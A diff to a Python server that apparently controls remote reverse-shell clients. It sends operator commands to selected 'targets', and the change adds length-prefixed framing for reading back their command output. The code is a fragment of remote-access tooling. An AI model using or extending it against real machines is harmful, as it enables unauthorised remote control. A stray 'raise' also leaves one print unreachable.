@@ -2,6 +2,7 @@ import socket
 import threading
 import time
 from queue import Queue
+import struct
 from pprint import pprint
 
 NUMBER_OF_THREADS = 2
@@ -101,6 +102,24 @@ def get_target(cmd):
         print('Not a valid selection')
         return None
 
+def read_command_output(conn):
+    # Read message length and unpack it into an integer
+    raw_msglen = recvall(conn, 4)
+    if not raw_msglen:
+        return None
+    msglen = struct.unpack('>I', raw_msglen)[0]
+    # Read the message data
+    return recvall(conn, msglen)
+
+def recvall(conn, n):
+    # Helper function to recv n bytes or return None if EOF is hit
+    data = b''
+    while len(data) < n:
+        packet = conn.recv(n - len(data))
+        if not packet:
+            return None
+        data += packet
+    return data
 
 # Connect with remote target client
 def send_target_commands(target, conn):
@@ -113,13 +132,15 @@ def send_target_commands(target, conn):
             cmd = input()
             if len(str.encode(cmd)) > 0:
                 conn.send(str.encode(cmd))
-                client_response = str(conn.recv(20480), "utf-8")
+                cmd_output = read_command_output(conn)
+                client_response = str(cmd_output, "utf-8")
                 print(client_response, end="")
             if cmd == 'quit':
                 del all_connections[target]
                 del all_addresses[target]
                 break
         except:
+            raise
             print("Connection was lost")
             break
 
